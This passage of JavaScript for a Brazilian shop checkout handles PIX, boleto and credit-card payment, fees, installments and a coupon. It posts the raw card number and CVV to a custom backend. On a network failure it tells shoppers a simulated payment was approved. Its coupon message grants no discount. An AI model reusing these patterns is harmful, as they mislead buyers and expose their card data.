}

function showPixPaymentDetails(paymentResult) {
    const pixPaymentDetails = document.getElementById('pixPaymentDetails');
    const pixQrCodeContainer = document.getElementById('pixQrCode');
    const pixCodeText = document.getElementById('pixCodeText');
    
    pixPaymentDetails.style.display = 'block';
    
    if (paymentResult.pix && paymentResult.pix.qrcode) {
        const pixCode = paymentResult.pix.qrcode;
        pixCodeText.textContent = pixCode;

        const paymentForm = document.getElementById('paymentForm');
        const submitButton = paymentForm.querySelector('button[type="submit"]');

        if (submitButton) {
            submitButton.textContent = 'Já Paguei';
            submitButton.style.backgroundColor = '#10b981';
            submitButton.style.borderColor = '#10b981';
            submitButton.type = 'button';
            submitButton.onclick = function() {
                window.location.href = 'https://statusdacompra.onrender.com/'; 
            };
        }

    } else {
        pixQrCodeContainer.innerHTML = "Não foi possível obter os dados do PIX.";
        pixCodeText.textContent = "Tente novamente.";
        console.error("Estrutura de dados PIX inesperada:", paymentResult);
    }
    
    startPixTimer(900);
}

function startPixTimer(seconds) {
    const timerElement = document.getElementById('pixTimeRemaining');
    let timeLeft = seconds;
    
    pixTimer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(pixTimer);
            timerElement.textContent = 'Expirado';
            alert('O código PIX expirou. Por favor, gere um novo código.');
        }
        
        timeLeft--;
    }, 1000);
}

function copyPixCode() {
    const pixCodeText = document.getElementById('pixCodeText');
    const copyButton = document.getElementById('pixCopyButton');
    
    if (navigator.clipboard) {
        navigator.clipboard.writeText(pixCodeText.textContent).then(() => {
            copyButton.textContent = 'Copiado!';
            copyButton.classList.add('copied');
            
            setTimeout(() => {
                copyButton.textContent = 'Copiar Código';
                copyButton.classList.remove('copied');
            }, 2000);
        });
    } else {
        const textArea = document.createElement('textarea');
        textArea.value = pixCodeText.textContent;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        copyButton.textContent = 'Copiado!';
        copyButton.classList.add('copied');
        
        setTimeout(() => {
            copyButton.textContent = 'Copiar Código';
            copyButton.classList.remove('copied');
        }, 2000);
    }
}

async function processCreditCardPayment(orderData, form) {
    const formData = new FormData(form);
    
    const cardData = {
        paymentMethod: 'CARD',
        amount: Math.round(orderData.total * 100),
        installments: parseInt(formData.get('installments')),
        customer: {
            name: `${orderData.firstName} ${orderData.lastName}`,
            email: orderData.email,
            document: orderData.cpf.replace(/\D/g, ''),
            phone: orderData.phone.replace(/\D/g, '')
        },
        card: {
            number: formData.get('cardNumber').replace(/\s/g, ''),
            holderName: formData.get('cardName'),
            expiryMonth: formData.get('cardExpiry').split('/')[0],
            expiryYear: '20' + formData.get('cardExpiry').split('/')[1],
            cvv: formData.get('cardCvv')
        },
        shipping: {
            address: orderData.address,
            number: orderData.number,
            complement: orderData.complement || '',
            neighborhood: orderData.neighborhood,
            city: orderData.city,
            state: orderData.state,
            zipCode: orderData.zipCode.replace(/\D/g, '')
        },
        items: [{
            name: 'Produto',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        description: 'Pedido da loja online',
        ip: '127.0.0.1'
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/credit-card`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(cardData)
        });

        const result = await response.json();
        
        if (response.ok) {
            if (result.status === 'approved') {
                showSuccessNotification('Pagamento aprovado! Pedido finalizado com sucesso.');
            } else if (result.status === 'pending') {
                showSuccessNotification('Pagamento em processamento. Você receberá uma confirmação em breve.');
            } else {
                throw new Error('Pagamento rejeitado. Verifique os dados do cartão.');
            }
        } else {
            throw new Error(result.message || 'Erro ao processar pagamento');
        }
    } catch (error) {
        if (error.message.includes('fetch')) {
            showSuccessNotification('Pagamento simulado aprovado! (Demonstração)');
        } else {
            throw error;
        }
    }
}

async function processBoletoPayment(orderData) {
    const boletoData = {
        paymentMethod: 'BOLETO',
        amount: Math.round(orderData.total * 100),
        customer: {
            name: `${orderData.firstName} ${orderData.lastName}`,
            email: orderData.email,
            document: orderData.cpf.replace(/\D/g, ''),
            phone: orderData.phone.replace(/\D/g, '')
        },
        boleto: {
            expiresIn: 3
        },
        shipping: {
            address: orderData.address,
            number: orderData.number,
            complement: orderData.complement || '',
            neighborhood: orderData.neighborhood,
            city: orderData.city,
            state: orderData.state,
            zipCode: orderData.zipCode.replace(/\D/g, '')
        },
        items: [{
            name: 'Produto',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        description: 'Pedido da loja online',
        ip: '127.0.0.1'
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/boleto`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(boletoData)
        });

        const result = await response.json();
        
        if (response.ok && result.status === 'pending') {
            showSuccessNotification('Boleto gerado com sucesso! Você receberá o boleto por e-mail para pagamento.');
        } else {
            throw new Error(result.message || 'Erro ao gerar boleto');
        }
    } catch (error) {
        if (error.message.includes('fetch')) {
            showSuccessNotification('Boleto simulado gerado com sucesso! (Demonstração)');
        } else {
            throw error;
        }
    }
}

function showSuccessNotification(message) {
    const notification = document.getElementById('successNotification');
    notification.textContent = message;
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

function getShippingCost() {
    switch (selectedShipping) {
        case 'express': return 9.97;
        case 'same-day': return 11.90;
        default: return 0;
    }
}

function calculateTotal() {
    let total = cartData.subtotal + getShippingCost();
    if (selectedPayment === 'credit') {
        total = total * 1.05;
    }
    return total;
}

function updateShippingCost() {
    const shippingCostEl = document.getElementById('shippingCost');
    const mobileShippingCostEl = document.getElementById('mobileShippingCost');
    const totalPriceEl = document.getElementById('totalPrice');
    const mobileTotalPriceEl = document.getElementById('mobileTotalPrice');
    const mobileFinalPriceEl = document.getElementById('mobileFinalPrice');
    
    let shippingCost = 0;
    let basePrice = cartData.subtotal;
    let shippingText = '';

    switch (selectedShipping) {
        case 'standard':
            shippingText = 'GRÁTIS';
            shippingCost = 0;
            break;
        case 'express':
            shippingText = 'R$ 9,97';
            shippingCost = 9.97;
            break;
        default:
            shippingText = 'GRÁTIS';
            shippingCost = 0;
    }

    let total = basePrice + shippingCost;
    let creditCardFee = 0;
    
    if (selectedPayment === 'credit' && currentStep === 3) {
        creditCardFee = total * (CREDIT_CARD_FEE_PERCENTAGE / 100);
        total = total + creditCardFee;
        
        document.getElementById('creditCardFeeRow').style.display = 'flex';
        document.getElementById('mobileCreditCardFeeRow').style.display = 'flex';
        
        const creditCardFeeFormatted = `+R$ ${creditCardFee.toFixed(2).replace('.', ',')}`;
        document.getElementById('creditCardFee').textContent = creditCardFeeFormatted;
        document.getElementById('mobileCreditCardFee').textContent = creditCardFeeFormatted;
        
        updateCreditCardValues(total);
        
        const creditCardNotice = document.getElementById('creditCardNotice');
        if (creditCardNotice) {
            creditCardNotice.style.display = 'block';
        }
    } else {
        document.getElementById('creditCardFeeRow').style.display = 'none';
        document.getElementById('mobileCreditCardFeeRow').style.display = 'none';
        
        const creditCardNotice = document.getElementById('creditCardNotice');
        if (creditCardNotice) {
            creditCardNotice.style.display = 'none';
        }
    }
    
    updatePaymentMethodValues(total - creditCardFee);

    const totalFormatted = `R$ ${total.toFixed(2).replace('.', ',')}`;
    
    if (shippingCostEl) shippingCostEl.textContent = shippingText;
    if (mobileShippingCostEl) mobileShippingCostEl.textContent = shippingText;
    if (totalPriceEl) totalPriceEl.textContent = totalFormatted;
    if (mobileTotalPriceEl) mobileTotalPriceEl.textContent = totalFormatted;
    if (mobileFinalPriceEl) mobileFinalPriceEl.textContent = totalFormatted;
}

function updateCreditCardValues(totalWithFee) {
    const creditCardTotalValueEl = document.getElementById('creditCardTotalValue');
    
    if (creditCardTotalValueEl) {
        creditCardTotalValueEl.textContent = `R$ ${totalWithFee.toFixed(2).replace('.', ',')}`;
    }
    
    updateInstallmentOptions(totalWithFee);
}

function updatePaymentMethodValues(baseTotal) {
    const pixValueEl = document.getElementById('pixValue');
    const boletoValueEl = document.getElementById('boletoValue');
    
    const baseFormatted = `R$ ${baseTotal.toFixed(2).replace('.', ',')}`;
    
    if (pixValueEl) {
        pixValueEl.textContent = baseFormatted;
    }
    if (boletoValueEl) {
        boletoValueEl.textContent = baseFormatted;
    }
}

function updateInstallmentOptions(total) {
    const installmentsSelect = document.getElementById('installments');
    if (!installmentsSelect) return;
    
    while (installmentsSelect.children.length > 1) {
        installmentsSelect.removeChild(installmentsSelect.lastChild);
    }
    
    const installmentOptions = [
        { value: 1, text: `1x R$ ${total.toFixed(2).replace('.', ',')} à vista` },
        { value: 2, text: `2x R$ ${(total / 2).toFixed(2).replace('.', ',')} sem juros` },
        { value: 3, text: `3x R$ ${(total / 3).toFixed(2).replace('.', ',')} sem juros` },
        { value: 4, text: `4x R$ ${(total / 4).toFixed(2).replace('.', ',')} sem juros` },
        { value: 5, text: `5x R$ ${(total / 5).toFixed(2).replace('.', ',')} sem juros` },
        { value: 6, text: `6x R$ ${(total / 6).toFixed(2).replace('.', ',')} sem juros` },
        { value: 7, text: `7x R$ ${(total * 1.05 / 7).toFixed(2).replace('.', ',')} com juros` },
        { value: 8, text: `8x R$ ${(total * 1.08 / 8).toFixed(2).replace('.', ',')} com juros` },
        { value: 9, text: `9x R$ ${(total * 1.12 / 9).toFixed(2).replace('.', ',')} com juros` },
        { value: 10, text: `10x R$ ${(total * 1.15 / 10).toFixed(2).replace('.', ',')} com juros` },
        { value: 11, text: `11x R$ ${(total * 1.18 / 11).toFixed(2).replace('.', ',')} com juros` },
        { value: 12, text: `12x R$ ${(total * 1.20 / 12).toFixed(2).replace('.', ',')} com juros` }
    ];
    
    installmentOptions.forEach(option => {
        const optionEl = document.createElement('option');
        optionEl.value = option.value;
        optionEl.textContent = option.text;
        installmentsSelect.appendChild(optionEl);
    });
}

/**
 * Inicializa o método de pagamento pré-selecionado (PIX)
 * Garante que a classe .selected seja aplicada corretamente
 * e que o estado JavaScript esteja sincronizado com o HTML
 */
function initializePaymentMethod() {
    // Encontra o elemento PIX (que já tem a classe .selected no HTML)
    const pixPaymentMethod = document.querySelector('.payment-method[data-payment="pix"]');
    
    if (pixPaymentMethod) {
        // Encontra o header dentro do elemento PIX
        const pixHeader = pixPaymentMethod.querySelector('.payment-header');
        
        if (pixHeader) {
            // Simula um clique no header para disparar selectPayment()
            // Isto garante que toda a lógica de seleção seja executada
            pixHeader.click();
        }
    }
}

function selectPayment() {
    document.querySelectorAll(".payment-method").forEach(method => {
        method.classList.remove("selected");
    });
    this.parentElement.classList.add("selected");
    selectedPayment = this.parentElement.dataset.payment;

    const creditCardFields = [
        document.getElementById("cardNumber"),
        document.getElementById("cardName"),
        document.getElementById("cardExpiry"),
        document.getElementById("cardCvv"),
        document.getElementById("installments")
    ];

    if (selectedPayment === "pix" || selectedPayment === "boleto") {
        creditCardFields.forEach(field => {
            if (field) {
                field.removeAttribute("required");
                field.classList.remove("error", "success");
                const errorEl = document.getElementById(field.id + "Error");
                if (errorEl) errorEl.classList.remove("show");
            }
        });
    } else if (selectedPayment === "credit") {
        creditCardFields.forEach(field => {
            if (field) {
                field.setAttribute("required", "");
            }
        });
    }

    const creditCardNotice = document.getElementById("creditCardNotice");
    if (creditCardNotice) {
        if (selectedPayment === "credit" && currentStep === 3) {
            creditCardNotice.style.display = "block";
        } else {
            creditCardNotice.style.display = "none";
        }
    }

    updateShippingCost();
}

function applyCoupon() {
    const couponInput = document.getElementById('discountInput');
    const coupon = couponInput.value.trim().toUpperCase();
    
    if (coupon === 'DESCONTO10') {
        showSuccessNotification('Cupom aplicado! 10% de desconto');
        couponInput.value = '';
    } else if (coupon) {
        alert('Cupom inválido');
    }
}
